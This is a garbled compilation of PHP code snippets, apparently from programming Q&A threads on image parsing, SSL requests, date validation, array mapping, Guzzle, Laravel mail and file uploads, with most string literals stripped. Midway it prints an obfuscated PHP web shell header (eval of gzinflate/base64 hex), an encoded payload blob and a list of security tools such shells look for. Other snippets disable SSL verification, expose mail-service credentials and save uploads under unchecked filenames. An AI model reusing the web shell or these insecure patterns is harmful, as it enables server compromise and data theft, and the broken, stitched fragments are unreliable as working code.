function ReSizeImagesInHTML($HTMLContent,$MaximumWidth,$MaximumHeight) { preg_match_all( $imagearray = array(); for ($i = 0; $i < count($rawimagearray); $i++) { array_push($imagearray, $rawimagearray[$i][0]); } $imageinfo = array(); foreach($imagearray as $img_tag) { preg_match_all( } $AllImageInfo = array(); foreach($imagearray as $img_tag) { $ImageSource = str_replace( $OrignialWidth = str_replace( $OrignialHeight = str_replace( $NewWidth = $OrignialWidth; $NewHeight = $OrignialHeight; $AdjustDimensions = "F"; if($OrignialWidth > $MaximumWidth) { $diff = $OrignialWidth-$MaximumHeight; $percnt_reduced = (($diff/$OrignialWidth)*100); $NewHeight = floor($OrignialHeight-(($percnt_reduced*$OrignialHeight)/100)); $NewWidth = floor($OrignialWidth-$diff); $AdjustDimensions = "T"; } if($OrignialHeight > $MaximumHeight) { $diff = $OrignialHeight-$MaximumWidth; $percnt_reduced = (($diff/$OrignialHeight)*100); $NewWidth = floor($OrignialWidth-(($percnt_reduced*$OrignialWidth)/100)); $NewHeight= floor($OrignialHeight-$diff); $AdjustDimensions = "T"; } $thisImageInfo = array( array_push($AllImageInfo, $thisImageInfo); } $ImageBeforeAndAfter = array(); for ($i = 0; $i < count($AllImageInfo); $i++) { if($AllImageInfo[$i][ $NewImageTag = str_ireplace( $NewImageTag = str_ireplace( $thisImageBeforeAndAfter = array( array_push($ImageBeforeAndAfter, $thisImageBeforeAndAfter); } } for ($i = 0; $i < count($ImageBeforeAndAfter); $i++) { $HTMLContent = str_ireplace($ImageBeforeAndAfter[$i][ } return $HTMLContent; }
$res[0] = "<img src="; $res[1] = "/image/fluffybunny.jpg"; $res[2] = "title="; $res[3] = "Harvey the bunny"; $res[4] = "alt="; $res[5] = "a cute little fluffy bunny"; $res[6] = "/>";
$doc= qp($myHtmlDoc); foreach($doc->xpath( $src= $img->attr( $title= $img->attr( $alt= $img->attr( }
$search = "any html code with image tags"; preg_match_all( if ( isset( $matches ) ) { foreach ($matches as $match) { if(strpos($match[0], "src")!==false) { $res = explode("\"", $match[0]); $image = parse_url($res[1], PHP_URL_PATH); $xml .= " <image:image>\n"; $xml .= " <image:loc>".home_url().$image."</image:loc>\n"; $xml .= " <image:caption>".htmlentities($title)."</image:caption>\n"; $xml .= " <image:license>".home_url()."</image:license>\n"; $xml .= " </image:image>\n"; } } }
array(2) { [0]=> array(3) { [0]=> string(10) " src="abc"" [1]=> string(3) "src" [2]=> string(3) "abc" } [1]=> array(3) { [0]=> string(10) " bla="123"" [1]=> string(3) "bla" [2]=> string(3) "123" } }
$content = get_the_content(); $count = substr_count($content, $start = 0; for ($i=0;$i<$count;$i++) { if ($i == 0){ $imgBeg = strpos($content, $post = substr($content, $imgBeg); } else { $imgBeg = strpos($post, $post = substr($post, $imgBeg-2); } $imgEnd = strpos($post, $postOutput = substr($post, 0, $imgEnd+1); $postOutput = preg_replace( $image[$i] = $postOutput; $start= $imgEnd + 1; } print_r($image);
$html = $attribute = $doc = new DOMDocument(); @$doc->loadHTML($html); $attributeValue = @$doc->documentElement->firstChild->firstChild->attributes->getNamedItem($attribute)->value; echo $attributeValue;
<img.*?(?:(?:\s+(src)="([^"]+)")|(?:\s+(alt)="([^"]+)")|(?:\s+(title)="([^"]+)")|(?:\s+[^\s]+))+.*/>
<?php $response = file_get_contents("https: echo $response; ?>
<?php $arrContextOptions=array( "ssl"=>array( "verify_peer"=>false, "verify_peer_name"=>false, ), ); $response = file_get_contents("https: echo $response; ?>
$arrContextOptions=array( "ssl"=>array( "cafile" => "/path/to/bundle/cacert.pem", "verify_peer"=> true, "verify_peer_name"=> true, ), ); $response = file_get_contents("https:
function file_get_contents_curl( $url ) { $ch = curl_init(); curl_setopt( $ch, CURLOPT_AUTOREFERER, TRUE ); curl_setopt( $ch, CURLOPT_HEADER, 0 ); curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 ); curl_setopt( $ch, CURLOPT_URL, $url ); curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, TRUE ); $data = curl_exec( $ch ); curl_close( $ch ); return $data; }
$req = new HTTP_Request2($url); if (version_compare(PHP_VERSION, $req->setConfig( $req->setConfig( }
openssl s_client -showcerts -connect whatsyoururl.de:443 </dev/null 2>/dev/null|openssl x509 -outform PEM > /tmp/whatsyoururl.de.cert
cat /tmp/thawteRoot.crt > /tmp/chain.crt cat /tmp/thawteIntermediate.crt >> /tmp/chain.crt cat /tmp/tmp/whatsyoururl.de.cert >> /tmp/chain.crt
$arrContextOptions=array( "ssl"=>array( "cafile" => "/Applications/XAMPP/xamppfiles/share/openssl/certs/chain.pem", "verify_peer"=> true, "verify_peer_name"=> true, ), ); $response = file_get_contents($myHttpsURL, 0, stream_context_create($arrContextOptions));
array(8) { ["default_cert_file"]=> string(21) "/usr/lib/ssl/cert.pem" ["default_cert_file_env"]=> string(13) "SSL_CERT_FILE" ["default_cert_dir"]=> string(18) "/usr/lib/ssl/certs" ["default_cert_dir_env"]=> string(12) "SSL_CERT_DIR" ["default_private_dir"]=> string(20) "/usr/lib/ssl/private" ["default_default_cert_area"]=> string(12) "/usr/lib/ssl" ["ini_cafile"]=> string(0) "" ["ini_capath"]=> string(0) "" }
<?php $arrContextOptions=array( "ssl"=>array( "verify_peer"=>false, "verify_peer_name"=>false, ), ); $response = file_get_contents("https: echo $response; ?>
sudo apt-get install curl sudo apt-get install php-curl sudo /etc/init.d/apache2 reload
php hhvm if defined 0.18587779998779 0.046600103378296 require_once 1.2219581604004 3.2908599376678
<?php $LIMIT = 1000000; $start = microtime(true); for ($i=0; $i<$LIMIT; $i++) if (!defined( require( define( } $mid = microtime(true); for ($i=0; $i<$LIMIT; $i++) require_once( $end = microtime(true); printf("if defined\t%s\nrequire_once\t%s\n", $mid-$start, $end-$mid);
for i in /home/fbarnes/phpperf/hdr{00..99}.php; do echo "<?php cat helper.php >> $i; done
<?php for($i=0; $i < 100; $i++) { require_once "/home/fbarnes/phpperf/hdr$i.php"; } $pid = getmypid(); $fp = fopen("/proc/$pid/stat", "r"); $line = fread($fp, 2048); $array = split(" ", $line); $cntr = 0; foreach($array as $elem) { $cntr++; echo "stat[$cntr]: $elem\n"; } fclose($fp); ?>
<?php if(!defined( { require "../phpperf/common_hdr.php"; define( } ?>
time(NULL) = 1223772434 lstat64("/home", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 lstat64("/home/fbarnes", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 lstat64("/home/fbarnes/phpperf", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 lstat64("/home/fbarnes/phpperf/h", {st_mode=S_IFDIR|0755, st_size=270336, ...}) = 0 lstat64("/home/fbarnes/phpperf/h/hdr0.php", {st_mode=S_IFREG|0644, st_size=88, ...}) = 0 time(NULL) = 1223772434 open("/home/fbarnes/phpperf/h/hdr0.php", O_RDONLY) = 3
time(NULL) = 1223772905 lstat64("/home", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 lstat64("/home/fbarnes", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 lstat64("/home/fbarnes/phpperf", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0 lstat64("/home/fbarnes/phpperf/h", {st_mode=S_IFDIR|0755, st_size=270336, ...}) = 0 lstat64("/home/fbarnes/phpperf/h/hdr0.php", {st_mode=S_IFREG|0644, st_size=146, ...}) = 0 time(NULL) = 1223772905 open("/home/fbarnes/phpperf/h/hdr0.php", O_RDONLY) = 3
[fbarnes@myhost phpperf]$ wc -l strace_1000r.out strace_1000ro.out 190709 strace_1000r.out 210707 strace_1000ro.out 401416 total
[fbarnes@myhost phpperf]$ grep -c time strace_1000r.out strace_1000ro.out strace_1000r.out:20009 strace_1000ro.out:30008
[fbarnes@myhost phpperf]$ grep -c getcwd strace_1000r.out strace_1000ro.out strace_1000r.out:5 strace_1000ro.out:10004
[fbarnes@myhost phpperf]$ wc -l strace_1000r.out strace_1000ro.out 190705 strace_1000r.out 200705 strace_1000ro.out 391410 total [fbarnes@myhost phpperf]$ grep -c time strace_1000r.out strace_1000ro.out strace_1000r.out:20008 strace_1000ro.out:30008
require_once("includes/usergroups.php"); require_once("includes/permissions.php"); require_once("includes/revisions.php"); class User{ }
require_once("includes/helpers.php"); class MyClass{ }
require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php"); require_once("includes/helpers.php");
$key = if (isset($array[$key])) { } if (array_key_exists($key, $array)) { }
| Method Name | Run time | Difference ========================================================================================= | NonExistant::noCheckingTest() | 0.86004090309143 | +18491.315775911% | NonExistant::emptyTest() | 0.0046701431274414 | +0.95346080503016% | NonExistant::isnullTest() | 0.88424181938171 | +19014.461681183% | NonExistant::issetTest() | 0.0046260356903076 | Fastest | NonExistant::arrayKeyExistsTest() | 1.9001779556274 | +209.73055713%
$a = [null, true]; isset($a[0]) isset($a[1]) isset($a[2]) array_key_exists(0, $a) array_key_exists(1, $a) array_key_exists(2, $a) isset($a[0]) || array_key_exists(0, $a) isset($a[1]) || array_key_exists(1, $a) isset($a[2]) || array_key_exists(2, $a) array_key_isset(0, $a) array_key_isset(1, $a) array_key_isset(2, $a)
function array_key_isset($k, $a){ return isset($a[$k]) || array_key_exists($k, $a); }
<?php $a = array( $s = microtime(true); for($i=0; $i<=100000; $i++) { $t = (isset($a[ $t = (isset($a[ $t = (isset($a[ } $e = microtime(true); echo ?>
<?php $auth_pass = ""; $color = " $default_action = "FilesMan"; $default_charset = "Windows-1251"; preg_replace("/.*/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28 ?>
<?php print gzinflate(base64_decode("7b1tVxs50jD8OXvO9R9Er3fanhhjm2Q2Y7ADIZCQSSAD5GUC3N623bZ7aLs93W0Mk+W/31Wll5b6xZhkdq/7OedhJtDdKpVKUkkqlapK3rDM1tzJLL4tl7qn+ycf90/O7ddnZ++7H+Ctu/tq/+jMvqywCvv6P39j8FOaR264O3KnccTazAlD57ZsvQqCke9aVWad+vNwhg/vTo9eBDE+eU7XCftj79oN8fU3Zzpwb/DpxJn0fPhY2eKoh0HoOv1xWS/CiVjJwccKh8EfD2iO4nAWRMtorsqMbK3dZkPHj9ykFvJn7DoDNyxT7o1Grc6e1J+woyBmB8F8OrAlZfLHvfFi7dPd ?>
kav nod32 bdcored uvscan sav drwebd clamd rkhunter chkrootkit iptables ipfw tripwire shieldcc portsentry snort ossec lidsadm tcplodg sxid logcheck logwatch sysmask zmbscap sawmill wormscan ninja
function validateDate($date, $format = { $d = DateTime::createFromFormat($format, $date); return $d && $d->format($format) === $date; }
var_dump(validateDate( var_dump(validateDate( var_dump(validateDate( var_dump(validateDate( var_dump(validateDate( var_dump(validateDate( var_dump(validateDate( var_dump(validateDate( var_dump(validateDate(
function checkIsAValidDate($myDateString){ return (bool)strtotime($myDateString); }
function checkmydate($date) { $tempDate = explode( return checkdate($tempDate[1], $tempDate[2], $tempDate[0]); }
<?php function validateDateTime($dateStr, $format) { date_default_timezone_set( $date = DateTime::createFromFormat($format, $dateStr); return $date && ($date->format($format) === $dateStr); } validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime( validateDateTime(
$timestamp = strtotime($date); return $timestamp ? $date : null;
$date="2013-13-01"; if (preg_match("/^[0-9]{4}-(0[1-9]|1[0-2])-(0[1-9]|[1-2][0-9]|3[0-1])$/",$date)) { echo }else{ echo }
function checkmydate($date) { $tempDate = explode( return checkdate($tempDate[1], $tempDate[2], $tempDate[0]); }
<?php function validateDateTime($format) { return function($dateStr) use ($format) { $date = DateTime::createFromFormat($format, $dateStr); return $date && $date->format($format) === $dateStr; }; }
$validate = validateDateTime( $validate( $validate( $validate(
$dateTime = try { $dateTimeObject = new DateTime($dateTime); } catch (Exception $exc) { echo }
function isValidDate($date) { if (preg_match("/^(((((1[26]|2[048])00)|[12]\d([2468][048]|[13579][26]|0[48]))-((((0[13578]|1[02])-(0[1-9]|[12]\d|3[01]))|((0[469]|11)-(0[1-9]|[12]\d|30)))|(02-(0[1-9]|[12]\d))))|((([12]\d([02468][1235679]|[13579][01345789]))|((1[1345789]|2[1235679])00))-((((0[13578]|1[02])-(0[1-9]|[12]\d|3[01]))|((0[469]|11)-(0[1-9]|[12]\d|30)))|(02-(0[1-9]|1\d|2[0-8])))))$/", $date)) { return $date; } return null; }
/********************************************************************************* Returns TRUE if the input parameter is a valid date string in "YYYY-MM-DD" format (aka "MySQL date format") The date separator can be only the *********************************************************************************/ function isMysqlDate($yyyymmdd) { return checkdate(substr($yyyymmdd, 5, 2), substr($yyyymmdd, 8), substr($yyyymmdd, 0, 4)) && (substr($yyyymmdd, 4, 1) === && (substr($yyyymmdd, 7, 1) === }
/**** date check is a recursive function. it MONTH,DAY,YEAR. ******/ $always_valid_date = $this->date_check($month,$day,$year); private function date_check($month,$day,$year){ /** checkdate() is a php function that check a date is valid or not. if valid date it $status = checkdate($month,$day,$year); if($status == true){ $always_valid_date = $year . return $always_valid_date; }else{ $day = ($day - 1); /**recursive call**/ return $this->date_check($month,$day,$year); } }
$date = "2017-10-01"; function date_checker($input,$devider){ $output = false; $input = explode($devider, $input); $year = $input[0]; $month = $input[1]; $day = $input[2]; if (is_numeric($year) && is_numeric($month) && is_numeric($day)) { if (strlen($year) == 4 && strlen($month) == 2 && strlen($day) == 2) { $output = true; } } return $output; } if (date_checker($date, echo "The function is working"; }else { echo "The function isNOT working"; }
$d = DateTime::createFromFormat( $d2 = DateTime::createFromFormat( if(($d && $d->format( { return true; } else { return false; }
description "My PHP Worker" author "Jonathan" start on startup stop on shutdown respawn respawn limit 20 5 script [ $(exec /usr/bin/php -f /path/to/your/script.php) = end script
sudo service myphpworker start sudo service myphpworker stop
[Unit] Description=My PHP Daemon Service Requires=mysqld.service memcached.service After=mysqld.service memcached.service [Service] User=root Type=simple TimeoutSec=0 PIDFile=/var/run/myphpdaemon.pid ExecStart=/usr/bin/php -f /srv/www/myphpdaemon.php arg1 arg2> /dev/null 2>/dev/null KillMode=process Restart=on-failure RestartSec=42s StandardOutput=null StandardError=/var/log/myphpdaemon.log [Install] WantedBy=default.target
<?php gc_enable();// while (!connection_aborted() || PHP_SAPI == "cli") { if (PHP_SAPI == "cli") { if (rand(5, 100) % 5 == 0) { gc_collect_cycles(); } } }
[Unit] Description=PHP APP Sync Service Requires=mysqld.service memcached.service After=mysqld.service memcached.service [Service] User=root Type=simple TimeoutSec=0 PIDFile=/var/run/php_app_sync.pid ExecStart=/bin/sh -c KillMode=mixed Restart=on-failure RestartSec=42s [Install] WantedBy=default.target
script_path="/app/services/" while [ : ] do php -f "$script_path"${1}".php" fixedparameter ${2} > /dev/null 2>/dev/null sleep 1 done
ExecStart=/app/phpservice/runner.sh phpfile parameter > /dev/null 2>/dev/null KillMode=process
function clean_up() { GLOBAL $lock; mysql_close(); fclose($lock) exit(); } pcntl_signal(SIGINT,
if (!fclose(STDIN)) { exit("Could not close STDIN"); } if (!fclose(STDOUT)) { exit("Could not close STDOUT"); } if (!fclose(STDERR)) { exit("Could not close STDERR"); } $STDIN = fopen( $STDOUT = fopen( $STDERR = fopen(
$test_array = array("first_key" => "first_value", "second_key" => "second_value"); var_dump(array_map(function($a, $b) { return "$a loves $b"; }, array_keys($test_array), array_values($test_array)));
array(2) { [0]=> string(27) "first_key loves first_value" [1]=> string(29) "second_key loves second_value" }
$test_array = array("first_key" => "first_value", "second_key" => "second_value"); array_walk($test_array, function(&$a, $b) { $a = "$b loves $a"; }); var_dump($test_array);
function mymapper($arrayparam, $valuecallback) { $resultarr = array(); foreach ($arrayparam as $key => $value) { $resultarr[] = $valuecallback($key, $value); } return $resultarr; } $test_array = array("first_key" => "first_value", "second_key" => "second_value"); $new_array = mymapper($test_array, function($a, $b) { return "$a loves $b"; }); var_dump($new_array);
$states = array( array_map(function ($short, $long) { return array( ); }, array_keys($states), $states); array( array( array( )
function array_map_assoc(callable $f, array $a) { return array_column(array_map($f, array_keys($a), $a), 1, 0); }
$ordinals = [ ]; $func = function ($k, $v) { return [ }; var_dump(array_map_assoc($func, $ordinals));
array(3) { ["new first"]=> string(7) "new 1st" ["new second"]=> string(7) "new 2nd" ["new third"]=> string(7) "new 3rd" }
function array_map_assoc_partial(callable $f) { return function (array $a) use ($f) { return array_column(array_map($f, array_keys($a), $a), 1, 0); }; } ... $my_mapping = array_map_assoc_partial($func); var_dump($my_mapping($ordinals));
function array_map_assoc(callable $f, array $a) { return array_merge(...array_map($f, array_keys($a), $a)); }
function array_map_assoc(callable $f, array $a) { return array_reduce(array_map($f, array_keys($a), $a), function (array $acc, array $a) { return $acc + $a; }, []); }
$ordinals = [ ]; $func = function ($k, $v) { return [ }; var_dump(array_map_assoc($func, $ordinals));
$test_array = ["first_key" => "first_value", "second_key" => "second_value"]; $array_map_assoc = function (callable $f, array $a) { return array_column(array_map($f, array_keys($a), $a), 1, 0); }; $f = function ($key, $value) { return [$key, $key . }; var_dump(array_values($array_map_assoc($f, $test_array)));
$test_array = ["first_key" => "first_value", "second_key" => "second_value"]; $array_map_assoc = function (callable $f, array $a) { return array_map($f, array_keys($a), $a); }; $f = function ($key, $value) { return $key . }; var_dump($array_map_assoc($f, $test_array));
$test_array = array("first_key" => "first_value", "second_key" => "second_value"); var_dump( array_map( function($key) use ($test_array) { return "$key loves ${test_array[$key]}"; }, array_keys($test_array) ) );
$mapped_array = from($test_array) ->select(function ($v, $k) { return "$k loves $v"; }) ->toArray();
function array_map_associative(callable $callback, $array) { return array_map(function($key) use ($callback, $array){ return $callback($key, $array[$key]); }, array_keys($array)); }
$test_array = array("first_key" => "first_value", "second_key" => "second_value"); $result_array = array(); array_walk($test_array, function($a, $b) use (&$result_array) { $result_array[] = "$b loves $a"; }, $result_array); var_dump($result_array);
function map($array, callable $fn) { foreach ($array as $k => &$v) $v = call_user_func($fn, $k, $v); return $array; }
function map($array, callable $fn = null) { return array_map($fn, array_keys($array), $array); }
function array_map_($callback, $arr) { if (!is_callable($callback)) return $arr; $result = array_walk($arr, function(&$value, $key) use ($callback) { $value = call_user_func($callback, $key, $value); }); if (!$result) return false; return $arr; }
$test_array = array("first_key" => "first_value", "second_key" => "second_value"); var_dump(array_map_(function($key, $value){ return $key . " loves " . $value; }, $arr));
array_values(array_map_(function($key, $value){ return $key . " loves " . $value; }, $test_array))
<?php /** * array_map_kv() * An array mapping function to map with both keys and values. * * @param $callback callable * A callback function($key, $value) for mapping values. * @param $array array * An array for mapping. */ function array_map_kv(callable $callback, array $array) { return array_map( function ($key) use ($callback, $array) { return $callback($key, $array[$key]); }, array_keys($array) ); } var_dump(array_map_kv(function ($key, $value) { return "{$key} loves {$value}"; }, array( "first_key" => "first_value", "second_key" => "second_value", ))); ?>
array(2) { [0]=> string(27) "first_key loves first_value" [1]=> string(29) "second_key loves second_value" }
function array_map2(callable $f, array $a) { return array_map($f, array_keys($a), $a); }
$test_array = array("first_key" => "first_value", "second_key" => "second_value"); var_dump(array_map2(function($a, $b) { return "$a loves $b"; }, $test_array));
function array_map_assoc(){ if(func_num_args() < 2) throw new \BadFuncionCallException( $args = func_get_args(); $callback = $args[0]; if(!is_callable($callback)) throw new \InvalidArgumentException( $arrays = array_slice($args, 1); array_walk($arrays, function(&$a){ $a = (array)$a; reset($a); }); $results = array(); $max_length = max(array_map( $arrays = array_map(function($pole) use ($max_length){ return array_pad($pole, $max_length, null); }, $arrays); for($i=0; $i < $max_length; $i++){ $elements = array(); foreach($arrays as &$v){ $elements[] = each($v); } unset($v); $out = call_user_func_array($callback, $elements); if($out === null) continue; $val = isset($out[1]) ? $out[1] : null; if(isset($out[0])){ $results[$out[0]] = $val; }else{ $results[] = $val; } } return $results; }
/** * @param array $array * @param callable $callback * @return array */ function arrayMap(array $array, callable $callback) { $newArray = []; foreach( $array as $key => $value ) { $newArray[] = call_user_func($callback, $value, $key, $array); } return $newArray; }
$testArray = [ "first_key" => "first_value", "second_key" => "second_value" ]; var_dump( arrayMap($testArray, function($value, $key) { return $key . }); );
$myArray = [ "key0" => 0, "key1" => 1, "key2" => 2 ]; array_combine( array_keys($myArray), array_map( function ($intVal) { return strval($intVal); }, $myArray ) );
array(3) { ["key0"]=> string(1) "0" ["key1"]=> string(1) "1" ["key2"]=> string(1) "2" }
$test_array = [ "first_key" => "first_value", "second_key" => "second_value" ]; $f = function($ar) { return array_map( function($key, $val) { return "{$key} - {$val}"; }, array_keys($ar), $ar ); }; $res = $f($test_array); $res = array_combine( array_keys($test_array), $f($test_array) );
$variables = array_reduce($invoice[ $result[$item[ return $result; }, array());
$request = $this->client->post(self::URL_REGISTER,array( ),array(json_encode($_POST)));
use GuzzleHttp\Client; $client = new Client(); $response = $client->post( GuzzleHttp\RequestOptions::JSON => [ ]);
$request = $this->client->post($url,array( ),array()); $request->setBody($data); $response = $request->send(); return $response;
$client = new Client([ ]); $response = $client->post( [ [ ] )] );
$client = new \GuzzleHttp\Client(); $body[ $body[ $body[ $res = $client->post($url, [ $code = $res->getStatusCode(); $result = $res->json();
$client = new Client(); $result = $client->post( array("value_2" => "number2", "value_3" => "number3") ] ]); echo($result->getBody()->getContents());
$gClient = new \GuzzleHttp\Client([ $res = $gClient->post( array( ) );
$client = new \GuzzleHttp\Client([ $response = $client->post( ] ]); return $response->getBody();
-package that you need: "require": { "php" : ">=5.3.9", "guzzlehttp/guzzle": "^3.8" }, -php code (Digest is a type so pick different type if you need to, i have to include api server for authentication in this paragraph, some does not need to authenticate. If you use json you will need to replace any text $client = new Client(
$request = $client->post($url, array( $request->setBody($data); $response = $request->send(); echo $response->getBody(); die;
"require": { "php" : ">=5.5.0", "guzzlehttp/guzzle": "~6.0" }, $client = new Client([ ]); $url = "https: $data string variable is defined same as above. $r = $client->request( ]); echo $r->getBody(); die;
$client = new Client( $request = $client->post($base_url, array(
$auth = base64_encode( $urll = "https: $headers = array( ); $client = new Client(); $req_Memeber = new Request( $promise = $client->sendAsync($req_Memeber)->then(function ($res){ echo "Synched"; }); $promise->wait();
$a = array( ); var_dump(array_search( var_dump(array_search( var_dump(array_search(
function arrayValuePosition($value, $array) { return array_search($value, array_keys($array)); }
echo array_search("car", array_map("strval", array_keys($a)));
$a = array( "foo" => "bar", "nice", "car" => "fast", "none" ); $ind = 0; echo array_search($ind, array_map("strval", array_keys($a)));
$ind = 0; echo array_search((string)$ind, array_map("strval", array_keys($a)));
protected function getFirstPosition(array$array, $content, $key = true) { $index = 0; if ($key) { foreach ($array as $key => $value) { if ($key == $content) { return $index; } $index++; } } else { foreach ($array as $key => $value) { if ($value == $content) { return $index; } $index++; } } }
Return 0 if values on either side are equal Return 1 if value on the left is greater Return -1 if the value on the right is greater
echo 1 <=> 1; echo 3 <=> 4; echo 4 <=> 3; echo "x" <=> "x"; echo "x" <=> "y"; echo "y" <=> "x";
$things = [ [ ], [ ], [ ] ]; usort($things, function ($a, $b) { return $a[ }); usort($things, function ($a, $b) { return $b[ });
$db = new PDO( function some_function() { global $db; $db->query( }
class Database { private static $instance, $db; private function __construct(){} static function singleton() { if(!isset(self::$instance)) self::$instance = new __CLASS__; return self:$instance; } function get() { if(!isset(self::$db)) self::$db = new PDO( return self::$db; } } function some_function() { $db = Database::singleton(); $db->get()->query( } some_function();
class Database { private static $db; private function __construct(){} static function get() { if(!isset(self::$rand)) self::$db = new PDO( return self::$db; } } function some_function() { Database::get()->query( } some_function();
class Single { static private $_instance = false; public function __construct() { if (self::$_instance) throw new RuntimeException( self::$_instance = true; } private function __clone() { throw new RuntimeException( } public function __destruct() { self::$_instance = false; } } $a = new Single; $b = new Single; $b = clone($a); unset($a); $b = new Single;
if (ltrim($str, $str = ltrim($str, } else { $str = }
<?php $number = $withoutLeadingZeroes = preg_replace( echo $withoutLeadingZeroes; ?>
<?php $numString = "0000001123000"; $actualInt = "1123000"; $fixed_str1 = preg_replace( $fixed_str2 = ltrim($numString, $fixed_str3 = (int)$numString; echo $numString . " Original"; echo "<br>"; echo $fixed_str1 . " Fix1"; echo "<br>"; echo $fixed_str2 . " Fix2"; echo "<br>"; echo $fixed_str3 . " Fix3"; echo "<br>"; echo $actualInt . " Actual integer in string"; 0000001123000 Origina 1123 Fix1 1123000 Fix2 1123000 Fix3 1123000 Actual integer in tring
function removeZeroString($str= { while(trim(substr($str,0,1)) === { $str = ltrim($str, } return $str; }
echo round($val = "0005"); echo $val = 0005; echo round($val = 00000648370000075845); echo round($val = "00000648370000075845");
$test_str ="0002030050400000234892839000239074"; $fixed_str = preg_replace(
class MailController extends Controller { public function Sending_Email() { $this->call( return View( } }
MAIL_DRIVER=smtp MAIL_HOST=smtp.gmail.com MAIL_PORT=587 MAIL_USERNAME=MyUsername@gmail.com MAIL_PASSWORD=MyPassword
MAIL_DRIVER=smtp MAIL_HOST=smtp.gmail.com MAIL_PORT=587 MAIL_USERNAME=MyUsername@gmail.com MAIL_PASSWORD=MyPassword
MAIL_DRIVER=smtp MAIL_HOST=smtp.gmail.com MAIL_PORT=587 MAIL_USERNAME=example@gmail.com MAIL_PASSWORD=**************** MAIL_ENCRYPTION=tls
MAIL_DRIVER=smtp MAIL_HOST=smtp.gmail.com MAIL_PORT=587 MAIL_USERNAME=UserName@gmail.com MAIL_PASSWORD=******** MAIL_ENCRYPTION=tls
Host: mailtrap.io Port: 25 or 465 or 2525 Username: cb1d1475bc6cce Password: 7a330479c15f99 Auth: PLAIN, LOGIN and CRAM-MD5 TLS: Optional
php artisan cache:clear php artisan view:clear php artisan route:clear php artisan config:clear php artisan config:cache
MAIL_DRIVER=smtp MAIL_HOST=smtp.gmail.com MAIL_PORT=587 MAIL_USERNAME=yourusername MAIL_PASSWORD=yourpassword MAIL_ENCRYPTION=tls
if { } else if ($_SESSION[ session_destroy(); echo "Some error occured."; }
function redirect($url){ if (headers_sent()){ die( }else{ header( die(); } }
<?php http_redirect("relpath", array("name" => "value"), true, HTTP_REDIRECT_PERM); ?>
<?php ob_start(); ... do some work here ... do some more header("Location: http: exit(); ... do some work here ... do some more
function redirect_url($path) { header("location:".$path); exit; }
<!doctype html> <html> <head> <title>Test</title> </head> <body> <form method="post" enctype="multipart/form-data"> <input type="file" name="my_file[]" multiple> <input type="submit" value="Upload"> </form> <?php if (isset($_FILES[ $myFile = $_FILES[ $fileCount = count($myFile["name"]); for ($i = 0; $i < $fileCount; $i++) { ?> <p>File <p> Name: <?= $myFile["name"][$i] ?><br> Temporary file: <?= $myFile["tmp_name"][$i] ?><br> Type: <?= $myFile["type"][$i] ?><br> Size: <?= $myFile["size"][$i] ?><br> Error: <?= $myFile["error"][$i] ?><br> </p> <?php } } ?> </body> </html>
<form enctype="multipart/form-data" action="post_upload.php" method="POST">
<html> <head> </head> <body> <form name="uploader" id="uploader" action="multifile.php" method="POST" enctype="multipart/form-data" > <input id="infile" name="infile[]" type="file" onBlur="submit();" multiple="true" ></input> </form> <?php echo "No. files uploaded : ".count($_FILES[ $uploadDir = "images/"; for ($i = 0; $i < count($_FILES[ echo "File names : ".$_FILES[ $ext = substr(strrchr($_FILES[ $fPath = md5(rand() * time()) . ".$ext"; echo "File paths : ".$_FILES[ $result = move_uploaded_file($_FILES[ if (strlen($ext) > 0){ echo "Uploaded ". $fPath ." succefully. <br>"; } } echo "Upload complete.<br>"; ?> </body> </html>
<form method="post" enctype="multipart/form-data" > <input type="file" name="file[]" multiple id="file"/> <input type="submit" name="ok" /> </form>
<?php if(isset($_POST[ foreach ($_FILES[ echo $filename. } ?>
<form action="" method="POST" enctype="multipart/form-data"> Select image to upload: <input type="file" name="file[]" multiple/> <input type="submit" name="submit" value="Upload Image" /> </form>
<?php $file_dir = "uploads"; if (isset($_POST["submit"])) { for ($x = 0; $x < count($_FILES[ $file_name = $_FILES[ $file_tmp = $_FILES[ $file_target = $file_dir . DIRECTORY_SEPARATOR . $file_name; /* DIRECTORY_SEPARATOR = / or \ */ if (move_uploaded_file($file_tmp, $file_target)) { echo "{$file_name} has been uploaded. <br />"; } else { echo "Sorry, there was an error uploading {$file_name}."; } } } ?>
<?php $file_dir = "uploads"; if (isset($_POST["submit"])) { foreach ($_FILES[ $file_name = $_FILES[ $file_tmp = $_FILES[ $file_target = $file_dir . DIRECTORY_SEPARATOR . $file_name; /* DIRECTORY_SEPARATOR = / or \ */ if (move_uploaded_file($file_tmp, $file_target)) { echo "{$file_name} has been uploaded. <br />"; } else { echo "Sorry, there was an error uploading {$file_name}."; } } } ?>
